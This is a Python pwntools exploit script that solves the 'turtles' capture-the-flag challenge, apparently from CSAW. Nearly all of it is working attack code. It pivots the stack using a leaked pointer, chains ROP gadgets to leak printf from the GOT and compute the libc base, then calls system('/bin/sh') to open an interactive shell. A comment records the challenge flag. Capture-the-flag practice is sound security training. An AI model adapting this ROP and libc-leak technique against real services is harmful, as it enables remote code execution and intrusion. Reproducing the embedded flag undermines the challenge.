#!/usr/bin/env python

from pwn import *

pop4_ret = 0x400d3c # : pop r12; pop r13; pop r14; pop r15; ret;
pop_rbp = 0x400ac0 # : pop rbp; ret;
leave_ret = 0x400b82 #: leave; ret;
pop_rdi = 0x400d43 #: pop rdi; ret;
pop2_rsi = 0x400d41 #: pop rsi; pop r15; ret;
mov_eax_0 = 0x0000000000400cbc # : mov eax, 0; add rsp, 0x838; pop rbx; pop rbp; ret; 

def exploit():
  p.recvuntil("Here is a Turtle: 0x")
  turtle = int(p.recvline(keepends=False), 16)
  log.info("turtle: 0x{:x}".format(turtle))

  rop = ROP(name)
  rop.read(0, turtle)
  rop.raw(pop_rbp)
  rop.raw(turtle-8)
  rop.raw(leave_ret)

  offset = 0x20
  base = turtle + offset

  payload = ""
  payload += p64(base)
  payload += str(rop)
  payload = payload.ljust(64 + offset, "\x00")

  payload += p64(base + 0x80 - 0x28)

  payload = payload.ljust(0x60 + offset, "B")
  payload += p64(base + 0x90)

  payload = payload.ljust(0x80 + offset, "C")
  payload += p64(10)
  payload += p64(11)

  payload += p64(pop4_ret)

  p.sendline(payload)

  pause(2)

  rop2 = ROP(name)
  rop2.raw(mov_eax_0)
  rop2.raw("A"*(0x838 + 16))
  rop2.printf(binary.got["printf"], 0)
  rop2.main()

  p.sendline(str(rop2))

  printf = u64(p.recv(6).ljust(8, "\x00"))
  log.info("printf: 0x{:x}".format(printf))
  libc.address = printf - libc.symbols["printf"]
  log.info("libc: 0x{:x}".format(libc.address ))


  p.recvuntil("Here is a Turtle: 0x")
  turtle2 = int(p.recvline(keepends=False), 16)
  log.info("turtle2: 0x{:x}".format(turtle2))


  rop3 = ROP(libc)
  rop3.system(next(libc.search('/bin/sh\x00')))

  offset = 0x20
  base = turtle2 + offset
  
  payload = ""
  payload += p64(base)
  payload += str(rop3)
  payload = payload.ljust(64 + offset, "\x00")

  payload += p64(base + 0x80 - 0x28)

  payload = payload.ljust(0x60 + offset, "B")
  payload += p64(base + 0x90)

  payload = payload.ljust(0x80 + offset, "C")
  payload += p64(10)
  payload += p64(11)

  payload += p64(pop4_ret)

  p.sendline(payload)

  p.interactive()

  # flag{i_like_turtl3$_do_u?}


if __name__ == "__main__":
  name = "./turtles"
  binary = ELF(name)

  libc_name = "libs/libc.so.6"
  libc = ELF(libc_name)

  context.terminal=["tmux", "sp", "-h"]

  context.arch = "amd64"
  context.os = "linux"

  if len(sys.argv) > 1:
    p = remote("pwn.chal.csaw.io", 9003)
  else:
    p = process(name, env={'LD_LIBRARY_PATH': './libs/'})

  exploit()
